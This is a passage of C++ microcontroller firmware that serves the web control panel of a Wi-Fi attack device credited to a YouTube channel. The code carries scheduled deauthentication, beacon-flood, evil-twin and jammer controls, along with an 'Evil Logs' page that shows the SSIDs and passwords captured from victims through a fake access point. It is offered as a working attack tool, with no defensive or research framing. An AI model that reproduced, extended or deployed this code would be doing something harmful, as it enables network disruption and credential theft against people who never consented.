		*{margin: 0;padding: 0;box-sizing: border-box}:root{--animation-duration: 0.8s;--circle-diametr: 50px;--circle-scale-percent: 0.2}body{display: flex;justify-content: center;align-items: center;width: 100%;height: 100vh}#loader{position: relative;left: calc(var(--circle-diametr) * -1)}#loader::before,#loader::after{content: '';display: table-cell;width: var(--circle-diametr);height: var(--circle-diametr);border-radius: 50%;position: absolute;animation-duration: var(--animation-duration);animation-name: revolve;animation-iteration-count: infinite;animation-timing-function: ease-in-out;mix-blend-mode: darken}#loader::before{background: rgb(77, 232, 244)}#loader::after{background: rgb(253, 62, 62);animation-delay: calc(var(--animation-duration) / -2)}@keyframes revolve{0%{left: 0}25%{transform: scale(calc(1 + var(--circle-scale-percent)))}50%{left: var(--circle-diametr)}75%{transform: scale(calc(1 - var(--circle-scale-percent)))}100%{left: 0}}
	</style>
	</head>
	<body>
		<div id='loader'></div>
		<script>
			const evilMode = )" + String(evilMode ? "true" : "false") + R"(; if (evilMode) { setTimeout(() => { window.location.href = '/'; }, 60000); } else { setTimeout(() => { window.location.href = '/evil_html'; }, 5000); }
		</script>
	</body>
	</html>
	)";
	client.print(response.c_str());
}

void sendLogsPage(WiFiClient& client) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE html>
	<html lang='vi-VN'><head>
	<title>Evil Logs</title>
	<meta charset='UTF-8' name=viewport content='width=500px'>
	<style>
		body{background:#030303;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh}.container{width:500px;text-align:center;margin:50px 10px}table{--border:1px solid white;border-radius:5px;border-spacing:0;border-collapse:separate;border:var(--border);overflow:hidden;width:100%;box-shadow:0 0 10px #8c0000}table th:not(:last-child),table td:not(:last-child){border-right:var(--border)}table>thead>tr:not(:last-child)>th,table>thead>tr:not(:last-child)>td,table>tbody>tr:not(:last-child)>th,table>tbody>tr:not(:last-child)>td,table>tfoot>tr:not(:last-child)>th,table>tfoot>tr:not(:last-child)>td,table>tr:not(:last-child)>td,table>tr:not(:last-child)>th,table>thead:not(:last-child),table>tbody:not(:last-child),table>tfoot:not(:last-child){border-bottom:var(--border)}th{background:#8c0000;padding:10px}tr:nth-child(even){background:#010d23}th,td{padding:10px}.button-container{position:fixed;top:0;left:0;width:100%;display:flex;justify-content:space-around;z-index:1000}.top-button{background-color:#8c0000;color:white;padding:10px 20px;border:none;border-radius:0 0 15px 15px;cursor:pointer;box-shadow:0 2px 5px rgba(0,0,0,.2);transition:all .3s ease;min-width:100px;text-align:center}.top-button:hover{background-color:#45a049;transform:translateY(2px)}
	</style>
	</head><body>
	<div class='container'>
		<h2>)" + String(ENTERPASS[currentaplang]) + R"(</h2>
		<table><tr><th>)" + String(EVIL_SSID[currentaplang]) + R"(</th><th>)" + String(PASSWORD[currentaplang]) + R"(</th></tr>
	)";
	for (int i = 0; i < passwordCount; i++) {
		String evil_ssid = String(passwordList[i].evil_ssid);
		String evil_pass = String(passwordList[i].evil_pass);
		response += "<tr><td>" + htmlEscape(evil_ssid) + "</td><td>" + htmlEscape(evil_pass) + "</td></tr>";
	}
	response += R"(
		</table>
	<div class='button-container'>
	)";
	if (!evilMode) {
		response += "<button class='top-button' onclick='window.location.href=\"/evil\"'>" + String(BACK[currentaplang]) + "</button>";
		response += "<form action='/clearlogs' method='get' style='display: inline;'>";
		response += "<button class='top-button' type='submit' onclick='reloadWithDelay()'>" + String(CLEARLOGS[currentaplang]) + "</button></form>";
		response += "<button class='top-button' onclick='window.location.href=\"/evil_html\"'>" + String(HTML_PAGE[currentaplang]) + "</button>";
	}
	response += R"(
	</div>
	</div>
	<script>
		function reloadWithDelay() { setTimeout(() => { location.reload(); }, 1000); }
	</script>
	</body></html>)";
	client.print(response);
}

void sendHomePage(WiFiClient& client, uint32_t heap) {
	FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
	String currentapssid = (strlen(storedConfig.apssid) > 0) ? String(storedConfig.apssid) : String(apssid);
	String currentappass = (strlen(storedConfig.appass) > 0) ? String(storedConfig.appass) : String(appass);
	String hideapssid = storedConfig.hidden ? "checked" : "";
	int currentapchannel = storedConfig.apchannel;
	int currentaplang = storedConfig.aplang;
	String response = makeResponse(200, "text/html") + R"(
	<!DOCTYPE HTML>
	<html lang='vi-VN'><head>
	<meta charset='UTF-8' name='viewport' content='width=766px'>	
	<title>)" + String(currentapssid) + R"(</title>
	<style>
		body{background:#030303;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';font-size:small;margin:0}.content{width:100%;max-width:766px;min-width:766px;margin:10px auto;padding:10px}.flexbox{display:flex;justify-content:space-evenly;width:100%}.image{flex-shrink:0}.clickable-img{transition:all .2s ease}.clickable-img:active{transform:scale(.95);opacity:.8}.text{text-align:left}.text p{margin:10px auto}.container{display:flex;justify-content:space-between;width:766px;margin:0 auto;padding:10px 0;flex-direction:row;align-items:center}.btn{background:#00488d;color:#fff;border:none;border-radius:5px;cursor:pointer;margin-bottom:10px;width:150px;padding:10px 20px;transition:background .3s ease}.btn:hover,.btn.active{background:#8c0000}.center{text-align:center}.right{text-align:right}table{--border:1px solid white;border-radius:5px;border-spacing:0;border-collapse:separate;border:var(--border);overflow:hidden;width:100%;box-shadow:0 0 10px #8c0000}table th:not(:last-child),table td:not(:last-child){border-right:var(--border)}table>thead>tr:not(:last-child)>th,table>thead>tr:not(:last-child)>td,table>tbody>tr:not(:last-child)>th,table>tbody>tr:not(:last-child)>td,table>tfoot>tr:not(:last-child)>th,table>tfoot>tr:not(:last-child)>td,table>tr:not(:last-child)>td,table>tr:not(:last-child)>th,table>thead:not(:last-child),table>tbody:not(:last-child),table>tfoot:not(:last-child){border-bottom:var(--border)}th{background:#8c0000;padding:10px}tr:nth-child(even){background:#010d23}th,td{padding:10px}form{width:766px;display:flex;align-items:center;justify-content:center;gap:15px;float:left;margin:10px 0 20px}form label{font-weight:bold}form input{padding:10px;border:1px solid #fff;border-radius:5px;outline:none;width:80px}form input:focus{border-color:#007BFF}form select{padding:10px;border:1px solid #fff;border-radius:5px;outline:none;width:60px}.btn_save{background:#00488d;color:#fff;border:none;border-radius:5px;cursor:pointer;transition:background .3s ease;width:150px}.btn_save:hover{background:#8c0000}.blink{animation:blink-animation 1s infinite}@keyframes blink-animation{0%{opacity:1}50%{opacity:0}100%{opacity:1}}
	</style>
	</head><body>
	<div class='content'>
	<div class='flexbox'>
	<img class='clickable-img' onclick='sendReset()' src='/logo.png'>
	<div class='text'>
	<p>)" + String(INFO[currentaplang]) + R"(</p>
	<p>)" + String(WARNING[currentaplang]) + R"(</p>
	</div>
	</div>
	<form id='wifiForm' action='/saveconfig' method='post'>
		<label>)" + String(APSSID[currentaplang]) + R"(</label>
		<input type='text' name='apssid' placeholder=')" + currentapssid + R"('>
		<label>)" + String(APPASS[currentaplang]) + R"(</label>
		<input type='password' id='appass' name='appass' minlength='8' placeholder=')" + currentappass + R"('>
		<label>)" + String(HIDEAP[currentaplang]) + R"(</label>
		<input style='width: 20px;' type='checkbox' name='hidden' )" + hideapssid + R"(>
		<label for='apchannel'>)" + String(APCHANNEL[currentaplang]) + R"(</label>
		<select id='apchannel' name='apchannel'>
			<optgroup label='2.4GHz'>
				)" + generateChannelOptions(currentapchannel, channels_2g, sizeof(channels_2g)/sizeof(int)) + R"(
			</optgroup>
			<optgroup label='5GHz'>
				)" + generateChannelOptions(currentapchannel, channels_5g, sizeof(channels_5g)/sizeof(int)) + R"(
			</optgroup>
		</select>
		<label for='aplang'>)" + String(LANGUAGE[currentaplang]) + R"(</label>
		<select id='aplang' name='aplang'>
			<option value='1')" + (currentaplang == 1 ? " selected" : "") + R"(>VN</option>
			<option value='2')" + (currentaplang == 2 ? " selected" : "") + R"(>EN</option>
		</select>
		<input id='btnS' class='btn_save' type='submit' value=')" + String(SAVECONFIG[currentaplang]) + R"('>
	</form>
	<table id='myTable'><tr>
	<th><input type='checkbox' id='checkAll' onclick='toggleAll(this)'></th>
	<th>)" + String(NORDER[currentaplang]) + R"(</th>
	<th>)" + String(SSID[currentaplang]) + R"(</th>
	<th>)" + String(ENCRYPTION[currentaplang]) + R"(</th>
	<th>)" + String(MAC[currentaplang]) + R"(</th>
	<th>)" + String(CHANNEL[currentaplang]) + R"(</th>
	<th>)" + String(RSSI[currentaplang]) + R"(</th>
	<th>)" + String(FREQUENCY[currentaplang]) + R"(</th>
	</tr><tbody>
	)";
	for (size_t i = 0; i < scan_results.size(); i++) {
		response += "<tr><td class='center'><input class='rowCheckbox' type='checkbox' id='network"+ String(i) +"' onclick='toggleSelection("+ String(i) +")'";
		if (scan_results[i].selected) response += " checked";
		response += "></td><td class='center'>"+ String(i+1) +"</td>";
		response += "<td>" + scan_results[i].ssid + "</td>";
		response += "<td class='center'>" + getSecurityTypeString(scan_results[i].security) + "</td>";
		response += "<td class='center'>" + scan_results[i].bssid_str + "</td>";
		response += "<td class='right'>" + String(scan_results[i].channel) + "</td>";
		response += "<td class='right'>" + String(scan_results[i].rssi) + " dBm</td>";
		response += "<td class='right'>" + String((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td></tr>";
	}
	response += "</tbody></table>";
	if (deauth_reason != 0x02 && deauth_reason != 0x04 && deauth_reason != 0x07) deauth_reason = 0x02;
	response += R"(
	<div class='container' style='font-weight: bold;'>
		<label>)" + String(REASON[currentaplang]) + R"(</label>
		<input type='radio' name='reason' value='0x02' onclick='updateReason(this.value)' )" + String(deauth_reason == 0x02 ? "checked" : "") + R"(>
		<label>0x02</label>
		<input type='radio' name='reason' value='0x04' onclick='updateReason(this.value)' )" + String(deauth_reason == 0x04 ? "checked" : "") + R"(>
		<label>0x04</label>
		<input type='radio' name='reason' value='0x07' onclick='updateReason(this.value)' )" + String(deauth_reason == 0x07 ? "checked" : "") + R"(>
		<label>0x07</label>
	</div>
	<hr>
	<div class='container' style='font-weight: bold;'>
		<input type='checkbox' id='setstarttime' name='setstarttime' onchange='toggleStartTimeSettings()'>
		<label for='starthours'>)" + String(ATTIMEOUT[currentaplang]) + R"(</label>
		<input type='number' id='starthours' name='starthours' min='0' max='12' value='0' disabled> )" + String(HOUR[currentaplang]) + R"( 
		<input type='number' id='startminutes' name='startminutes' min='0' max='59' value='5' disabled> )" + String(MINUTE[currentaplang]) + R"(
		<input type='number' id='startseconds' name='startseconds' min='0' max='59' value='0' disabled> )" + String(SECOND[currentaplang]) + R"(
	</div>
	<hr>
	<p class='center' style='color: yellowgreen;' id='countdown'>)" + String(COUNTDOWN_1[currentaplang]) + R"(</p>
	<hr>
	<div class='container' style='font-weight: bold;'>
		<input type='checkbox' id='settime' name='settime' onchange='toggleTimeSettings()'>
		<label for='hours'>)" + String(ATDURATION[currentaplang]) + R"(</label>
		<input type='number' id='hours' name='hours' min='0' max='12' value='0' disabled> )" + String(HOUR[currentaplang]) + R"( 
		<input type='number' id='minutes' name='minutes' min='0' max='59' value='5' disabled> )" + String(MINUTE[currentaplang]) + R"(
		<input type='number' id='seconds' name='seconds' min='0' max='59' value='0' disabled> )" + String(SECOND[currentaplang]) + R"(
		<input type='checkbox' id='repeat' name='repeat' onchange='toggleOnPauseTimeSettings()' disabled> )" + String(LOOP[currentaplang]) + R"(
	</div>
	<div class='container' style='font-weight: bold;'>
		<input type='checkbox' id='setpausetime' name='setpausetime' onchange='togglePauseTimeSettings()' disabled>
		<label for='pausehours'>)" + String(ATPAUSE[currentaplang]) + R"(</label>
		<input type='number' id='pausehours' name='pausehours' min='0' max='12' value='0' disabled> )" + String(HOUR[currentaplang]) + R"( 
		<input type='number' id='pauseminutes' name='pauseminutes' min='0' max='59' value='5' disabled> )" + String(MINUTE[currentaplang]) + R"(
		<input type='number' id='pauseseconds' name='pauseseconds' min='0' max='59' value='0' disabled> )" + String(SECOND[currentaplang]) + R"(
	</div>
	<div class='container' style='font-weight: bold;'>
		<input type='checkbox' id='setofftime' name='setofftime' onchange='toggleOffTimeSettings()' disabled>
		<label for='offhours'>)" + String(ATPAUSELOOP[currentaplang]) + R"(</label>
		<input type='number' id='offhours' name='offhours' min='0' max='12' value='0' disabled> )" + String(HOUR[currentaplang]) + R"( 
		<input type='number' id='offminutes' name='offminutes' min='0' max='59' value='5' disabled> )" + String(MINUTE[currentaplang]) + R"(
		<input type='number' id='offseconds' name='offseconds' min='0' max='59' value='0' disabled> )" + String(SECOND[currentaplang]) + R"(
	</div>
	<hr>
	)";
	response += "<div class='container'>";
	response += "<button id='btnA' class='btn' onclick='buttonClick(\"A\")'>Deauth</button>";
	response += "<button id='btnB' class='btn' onclick='buttonClick(\"B\")'>Beacon</button>";
	response += "<button id='btnC' class='btn' onclick='buttonClick(\"C\")'>Random Beacon</button>";
	response += "<button id='btnD' class='btn' onclick='buttonClick(\"D\")'>Deauth Beacon</button>";
	response += "</div><div class='container'>";
	response += "<button class='btn' onclick='buttonEvil()'>Evil Twin</button>";
	response += "<button class='btn' onclick='buttonJam()'>Blue Jammer</button>";
	response += "<button class='btn' onclick='reloadPage()'>Refresh</button>";
	response += "<button id='btnE' class='btn' onclick='buttonClick(\"E\")'>Rescan</button>";
	response += "</div><hr><center><a href='#' style='text-decoration: none;color: white;'>© 2025 CHOMTV YOUTUBE CHANNEL</a> | FREE RAM: " + String(heap / 1024.0, 2) + " KB</center></div>";
	response += R"(
	
	<script>	
		var passInput = document.getElementById('appass'); passInput.addEventListener('focus', function() { passInput.type = 'text'; }); passInput.addEventListener('blur', function() { passInput.type = 'password'; }); function reloadWithDelay(waittime) { setTimeout(() => { location.reload(); }, waittime); } function reloadPage() { window.location.reload(true); return false; } document.addEventListener('DOMContentLoaded', function () { updateCheckAllStatus(); }); function updateCheckAllStatus() { let checkboxes = document.querySelectorAll('.rowCheckbox'); let checkAllBox = document.getElementById('checkAll'); let allChecked = Array.from(checkboxes).every(checkbox => checkbox.checked); checkAllBox.checked = allChecked; } function toggleSelection(index) { var xhttp = new XMLHttpRequest(); xhttp.open('GET', '/updateSelection?network=' + index, true); xhttp.send(); updateCheckAllStatus(); } function toggleAll(source) { let checkboxes = document.querySelectorAll('.rowCheckbox'); checkboxes.forEach((checkbox, index) => { if (checkbox.checked !== source.checked) { checkbox.checked = source.checked; setTimeout(() => { toggleSelection(index); }, 60); } }); updateCheckAllStatus(); } function updateReason(value) { var xhr = new XMLHttpRequest(); xhr.open('GET', '/set_reason?reason=' + value, true); xhr.send(); } function isAnyNetworkSelected() { let checkboxes = document.querySelectorAll('.rowCheckbox'); return Array.from(checkboxes).some(checkbox => checkbox.checked); } let countdownInterval; let selectedButton = ''; let logtime =''; let logsettime =''; )"; response += "let deauth_running = " + String(deauth_running ? "true" : "false") + ";\n"; response += "let beacon_running = " + String(beacon_running ? "true" : "false") + ";\n"; response += "let randombeacon_running = " + String(randombeacon_running ? "true" : "false") + ";\n"; response += "let deauthbeacon_running = " + String(deauthbeacon_running ? "true" : "false") + ";\n"; response += "let deauth_pause_running = " + String(deauth_pause_running ? "true" : "false") + ";\n"; response += "let beacon_pause_running = " + String(beacon_pause_running ? "true" : "false") + ";\n"; response += "let randombeacon_pause_running = " + String(randombeacon_pause_running ? "true" : "false") + ";\n"; response += "let deauthbeacon_pause_running = " + String(deauthbeacon_pause_running ? "true" : "false") + ";\n"; response += "let deauth_waiting_to_start = " + String(deauth_waiting_to_start ? "true" : "false") + ";\n"; response += "let beacon_waiting_to_start = " + String(beacon_waiting_to_start ? "true" : "false") + ";\n"; response += "let randombeacon_waiting_to_start = " + String(randombeacon_waiting_to_start ? "true" : "false") + ";\n"; response += "let deauthbeacon_waiting_to_start = " + String(deauthbeacon_waiting_to_start ? "true" : "false") + ";\n"; response += R"( function startCountdown(startTime) { clearInterval(countdownInterval); const serverStartTime = startTime; const clientBaseTime = Date.now(); const serverBaseTime = )" + String(millis()) + R"(; function updateCountdown() { let now = Date.now(); let elapsed = now - clientBaseTime; let serverNow = serverBaseTime + elapsed; let diff = Math.floor((serverStartTime - serverNow) / 1000); if (diff <= 0) { if (logsettime && logtime <= 0) { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_2[currentaplang]) + R"('; countdown.classList.add('blink'); } else { if (selectedButton === 'A') { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_3[currentaplang]) + R"('; } else if (selectedButton === 'B') { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_4[currentaplang]) + R"('; } else if (selectedButton === 'C') { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_5[currentaplang]) + R"('; } else if (selectedButton === 'D') { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_6[currentaplang]) + R"('; } updateStatus(); } clearInterval(countdownInterval); } else { let hours = Math.floor(diff / 3600); let minutes = Math.floor((diff % 3600) / 60); let seconds = diff % 60; document.getElementById('countdown').innerText = `)" + String(COUNTDOWN_7[currentaplang]) + R"( ${hours} )" + String(HOUR[currentaplang]) + R"( ${minutes} )" + String(MINUTE[currentaplang]) + R"( ${seconds} )" + String(SECOND[currentaplang]) + R"(`; if (selectedButton === 'A') { document.getElementById('btnA').innerText = ')" + String(STOP[currentaplang]) + R"('; } else if (selectedButton === 'B') { document.getElementById('btnB').innerText = ')" + String(STOP[currentaplang]) + R"('; } else if (selectedButton === 'C') { document.getElementById('btnC').innerText = ')" + String(STOP[currentaplang]) + R"('; } else if (selectedButton === 'D') { document.getElementById('btnD').innerText = ')" + String(STOP[currentaplang]) + R"('; } } } updateCountdown(); countdownInterval = setInterval(updateCountdown, 1000); } )" + (deauth_waiting_to_start ? "startCountdown(" + String(start_time) + ");" : "") + R"( function buttonClick(btn) { if (btn === 'E' || btn === 'F') { var xhttp = new XMLHttpRequest(); xhttp.open('GET', '/button' + btn, true); xhttp.send(); if (btn === 'E') { showPopup(')" + String(SCANNING[currentaplang]) + R"(', ')" + String(WAIT[currentaplang]) + R"('); reloadWithDelay(10000); } if (btn === 'F') { reloadWithDelay(60); } return; } if (!isAnyNetworkSelected()) { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_8[currentaplang]) + R"('; countdown.classList.add('blink'); return; } countdown.classList.remove('blink'); selectedButton = btn; setActive('btn' + btn); let time = 0; let repeat = document.getElementById('repeat').checked ? 1 : 0; let settime = document.getElementById('settime').checked ? 1 : 0; if (settime && (btn === 'A' || btn === 'B' || btn === 'C' || btn === 'D')) { let hours = document.getElementById('hours').value; let minutes = document.getElementById('minutes').value; let seconds = document.getElementById('seconds').value; time = parseInt(hours) * 3600 + parseInt(minutes) * 60 + parseInt(seconds); } logtime = time; logsettime = settime; let starttime = 0; let setstarttime = document.getElementById('setstarttime').checked ? 1 : 0; if (setstarttime && (btn === 'A' || btn === 'B' || btn === 'C' || btn === 'D')) { let starthours = document.getElementById('starthours').value; let startminutes = document.getElementById('startminutes').value; let startseconds = document.getElementById('startseconds').value; starttime = parseInt(starthours) * 3600 + parseInt(startminutes) * 60 + parseInt(startseconds); startCountdown()" + String(millis()) + R"( + starttime * 1000); reloadWithDelay(60); } else { if (settime && time <= 0) { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_2[currentaplang]) + R"('; countdown.classList.add('blink'); } else { if (btn === 'A') { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_3[currentaplang]) + R"('; document.getElementById('btnA').innerText = ')" + String(STOP[currentaplang]) + R"('; } else if (btn === 'B') { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_4[currentaplang]) + R"('; document.getElementById('btnB').innerText = ')" + String(STOP[currentaplang]) + R"('; } else if (btn === 'C') { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_5[currentaplang]) + R"('; document.getElementById('btnC').innerText = ')" + String(STOP[currentaplang]) + R"('; } else if (btn === 'D') { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_6[currentaplang]) + R"('; document.getElementById('btnD').innerText = ')" + String(STOP[currentaplang]) + R"('; } } } let pausetime = 0; let setpausetime = document.getElementById('setpausetime').checked ? 1 : 0; if (setpausetime && (btn === 'A' || btn === 'B' || btn === 'C' || btn === 'D')) { let pausehours = document.getElementById('pausehours').value; let pauseminutes = document.getElementById('pauseminutes').value; let pauseseconds = document.getElementById('pauseseconds').value; pausetime = parseInt(pausehours) * 3600 + parseInt(pauseminutes) * 60 + parseInt(pauseseconds); } let offtime = 0; let setofftime = document.getElementById('setofftime').checked ? 1 : 0; if (setofftime && (btn === 'A' || btn === 'B' || btn === 'C' || btn === 'D')) { let offhours = document.getElementById('offhours').value; let offminutes = document.getElementById('offminutes').value; let offseconds = document.getElementById('offseconds').value; offtime = parseInt(offhours) * 3600 + parseInt(offminutes) * 60 + parseInt(offseconds); } var xhttp = new XMLHttpRequest(); xhttp.open('GET', '/button' + btn + '?time=' + time + '&repeat=' + repeat + '&settime=' + settime + '&starttime=' + starttime + '&pausetime=' + pausetime + '&offtime=' + offtime, true); xhttp.send(); } function toggleTimeSettings() { let isChecked = document.getElementById('settime').checked; let repeatCheckbox = document.getElementById('repeat'); let setPauseTime = document.getElementById('setpausetime'); let setOffTime = document.getElementById('setofftime'); document.getElementById('hours').disabled = !isChecked; document.getElementById('minutes').disabled = !isChecked; document.getElementById('seconds').disabled = !isChecked; document.getElementById('repeat').disabled = !isChecked; if (!isChecked) { setPauseTime.disabled = !isChecked; setOffTime.disabled = !isChecked; repeatCheckbox.checked = false; setPauseTime.checked = false; setOffTime.checked = false; togglePauseTimeSettings(); toggleOffTimeSettings(); } } function toggleStartTimeSettings() { let isChecked = document.getElementById('setstarttime').checked; document.getElementById('starthours').disabled = !isChecked; document.getElementById('startminutes').disabled = !isChecked; document.getElementById('startseconds').disabled = !isChecked; } function toggleOnPauseTimeSettings() { let repeatCheckbox = document.getElementById('repeat'); let setPauseTime = document.getElementById('setpausetime'); let setOffTime = document.getElementById('setofftime'); let isChecked = repeatCheckbox.checked; setPauseTime.disabled = !isChecked; setOffTime.disabled = !isChecked; if (!isChecked) { setPauseTime.checked = false; setOffTime.checked = false; togglePauseTimeSettings(); toggleOffTimeSettings(); } } function togglePauseTimeSettings() { let isChecked = document.getElementById('setpausetime').checked; document.getElementById('pausehours').disabled = !isChecked; document.getElementById('pauseminutes').disabled = !isChecked; document.getElementById('pauseseconds').disabled = !isChecked; } function toggleOffTimeSettings() { let isChecked = document.getElementById('setofftime').checked; document.getElementById('offhours').disabled = !isChecked; document.getElementById('offminutes').disabled = !isChecked; document.getElementById('offseconds').disabled = !isChecked; } function updateStatus() { if (deauth_running || deauth_pause_running || deauth_waiting_to_start) { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_3[currentaplang]) + R"('; document.getElementById('btnA').innerText = ')" + String(STOP[currentaplang]) + R"('; setActive('btnA'); } else if (beacon_running || beacon_pause_running || beacon_waiting_to_start) { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_4[currentaplang]) + R"('; document.getElementById('btnB').innerText = ')" + String(STOP[currentaplang]) + R"('; setActive('btnB'); } else if (randombeacon_running || randombeacon_pause_running || randombeacon_waiting_to_start) { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_5[currentaplang]) + R"('; document.getElementById('btnC').innerText = ')" + String(STOP[currentaplang]) + R"('; setActive('btnC'); } else if (deauthbeacon_running || deauthbeacon_pause_running || deauthbeacon_waiting_to_start) { document.getElementById('countdown').innerText = ')" + String(COUNTDOWN_6[currentaplang]) + R"('; document.getElementById('btnD').innerText = ')" + String(STOP[currentaplang]) + R"('; setActive('btnD'); } else { clearAllActive(); } } let buttons = ['btnA', 'btnB', 'btnC', 'btnD', 'btnE', 'btnS']; function setActive(btnId) { clearAllActive(); const btn = document.getElementById(btnId); if (btn) { btn.classList.add('active'); btn.setAttribute('onclick', 'buttonClick("F")'); buttons.forEach(id => { if (id !== btnId) { const otherBtn = document.getElementById(id); if (otherBtn) { otherBtn.disabled = true; } } }); } buttons.forEach(id => { const btn = document.getElementById(id); if (btn) { btn.addEventListener('pointerdown', function (e) { if (btn.disabled) { e.preventDefault(); showPopup(')" + String(ERROR[currentaplang]) + R"(', ')" + String(RUNNING[currentaplang]) + R"('); } }); } }); } function clearAllActive() { buttons.forEach(id => { let btn = document.getElementById(id); if (btn) { btn.classList.remove('active'); btn.disabled = false; if (id === 'btnA') btn.setAttribute('onclick', 'buttonClick("A")'); if (id === 'btnB') btn.setAttribute('onclick', 'buttonClick("B")'); if (id === 'btnC') btn.setAttribute('onclick', 'buttonClick("C")'); if (id === 'btnD') btn.setAttribute('onclick', 'buttonClick("D")'); } }); } window.onload = function () { updateStatus(); }; function showPopup(title, message) { document.getElementById('popupTitle').innerText = title; document.getElementById('popupMessage').innerText = message; document.getElementById('popupOverlay').style.display = 'block'; } function closePopup() { document.getElementById('popupOverlay').style.display = 'none'; } function buttonEvil() { window.location.href = '/evil'; } function buttonJam() { window.location.href = '/blue'; } function sendReset() { fetch('/sys_reset') .then(response => console.log('Reset triggered')) .catch(error => console.error('Error:', error)); }
	</script>
	
	<div id='popupOverlay' style='display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.5); z-index:1000;'>
	<div id='popupBox' style='position:relative; margin:15% auto; padding:20px; background:white; width:300px; border-radius:10px; text-align:center; box-shadow:0 0 10px rgba(0,0,0,0.5);'>
    <h3 id='popupTitle' style='margin-top:0; color:#d00;'>)" + String(ERROR[currentaplang]) + R"(</h3>
    <p id='popupMessage' style='color: #00488d;'>)" + String(RUNNING[currentaplang]) + R"(</p>
    <button onclick='closePopup()' class='btn'>OK</button>
	</div>
	</div>
	</body></html>
	)";
	client.write(response.c_str());
}

void setup() {
	Serial.begin(115200);	
	pinMode(RESET_BUTTON_PIN, INPUT_PULLUP);
	pinMode(RESET_TRIGGER_PIN, INPUT);
	pinMode(PAUSE_PIN, INPUT);
	pinMode(START_PIN, INPUT);
	pinMode(OFF_BLUE_PIN, OUTPUT);
	pinMode(ON_BLUE_PIN, OUTPUT);
	pinMode(LED_R, OUTPUT);
	pinMode(LED_G, OUTPUT);
	pinMode(LED_B, OUTPUT);
	
	digitalWrite(RESET_TRIGGER_PIN, LOW);
	digitalWrite(PAUSE_PIN, LOW);
	digitalWrite(START_PIN, LOW);
	digitalWrite(LED_R, LOW);
	digitalWrite(LED_G, LOW);
	digitalWrite(LED_B, LOW);
	digitalWrite(OFF_BLUE_PIN, LOW);
	digitalWrite(ON_BLUE_PIN, LOW);
	
	int signature;
	
	FlashStorage.get(PASSWORDS_OFFSET, signature);
	if (signature != PASSWORDS_SIGNATURE || passwordCount > MAX_PASSWORDS) {
		passwordCount = 0;
		FlashStorage.put(PASSWORDS_OFFSET, PASSWORDS_SIGNATURE);
		FlashStorage.put(PASSWORDS_OFFSET + sizeof(signature), passwordCount);
	} else {
		FlashStorage.get(PASSWORDS_OFFSET + sizeof(signature), passwordCount);
		if (passwordCount > 0 && passwordCount <= MAX_PASSWORDS) {
			FlashStorage.get(PASSWORDS_OFFSET + sizeof(signature) + sizeof(passwordCount), passwordList);
		} else {
			passwordCount = 0;
		}
	}
	
	FlashStorage.get(0, signature);	
	if (signature == CONFIG_SIGNATURE) {
		FlashStorage.get(sizeof(signature), storedConfig);
	} else {
		strncpy(storedConfig.apssid, apssid, sizeof(storedConfig.apssid) - 1);
		storedConfig.apssid[sizeof(storedConfig.apssid) - 1] = '\0';
		strncpy(storedConfig.appass, appass, sizeof(storedConfig.appass) - 1);
		storedConfig.appass[sizeof(storedConfig.appass) - 1] = '\0';
		strncpy(storedConfig.evilssid, evilssid, sizeof(storedConfig.evilssid) - 1);
		storedConfig.evilssid[sizeof(storedConfig.evilssid) - 1] = '\0';
		storedConfig.hidden = false;
		storedConfig.apchannel = apchannel; 
		storedConfig.aplang = aplang;        
		FlashStorage.put(0, CONFIG_SIGNATURE);
		FlashStorage.put(sizeof(signature), storedConfig);
	}
	
	WiFi.config(local_ip);
	WiFi.apbegin(storedConfig.apssid, storedConfig.appass, (char *)String(storedConfig.apchannel).c_str(), storedConfig.hidden);
	if (scanNetworksAsync()) delay(5000);
	server.begin();
	digitalWrite(LED_R, HIGH);
	listenTimereset = millis();
}

bool isAnyNetworkSelected() {
	for (size_t i = 0; i < scan_results.size(); i++) {
		if (scan_results[i].selected) return true;
	} return false;
}

void startDeauth(int time, bool repeat, bool enable_time, int startdelay, int pausetime, int offtime) {
    if (!isAnyNetworkSelected()) return;
    attack_duration = time;
    repeat_attack = repeat;
    settime = enable_time;
    setstarttime = (startdelay > 0);
    setpausetime = (pausetime > 0); 
    if (setpausetime) pause_duration = pausetime;
	if (offtime > 0 && !setofftime) { 
		setofftime = true;
		off_duration = offtime;
		off_time = millis() + (off_duration * 1000); 
	}
    if (setstarttime) {
        start_time = millis() + (startdelay * 1000);
        deauth_waiting_to_start = true; 
    } else {
        deauth_waiting_to_start = false;
        deauth_running = true;
        deauth_pause_running = false;
        if (settime) end_time = millis() + (attack_duration * 1000);
    }
}

void startBeacon(int time, bool repeat, bool enable_time, int startdelay, int pausetime, int offtime) {
	if (!isAnyNetworkSelected()) return;
	attack_duration = time;
	repeat_attack = repeat;
	settime = enable_time;
	setstarttime = (startdelay > 0);
	setpausetime = (pausetime > 0); 
	if (setpausetime) pause_duration = pausetime;
	if (offtime > 0 && !setofftime) { 
		setofftime = true;
		off_duration = offtime;
		off_time = millis() + (off_duration * 1000); 
	}
	if (setstarttime) {
		start_time = millis() + (startdelay * 1000);
		beacon_waiting_to_start = true; 
	} else {
